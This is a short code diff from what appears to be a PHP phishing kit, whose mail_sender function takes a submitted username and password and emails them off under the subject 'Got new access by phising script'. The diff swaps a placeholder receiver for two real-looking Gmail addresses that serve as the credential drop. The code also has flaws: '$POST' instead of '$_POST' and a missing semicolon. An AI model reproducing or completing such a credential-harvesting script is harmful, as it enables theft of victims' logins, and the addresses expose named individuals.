@@ -2,8 +2,8 @@
 	mail_sender(){
 		$username = $POST['username'];
 		$password = $POST['password'];
-		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "bazgha.haron@gmail.com"
+		$reciever = "azahi1704@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
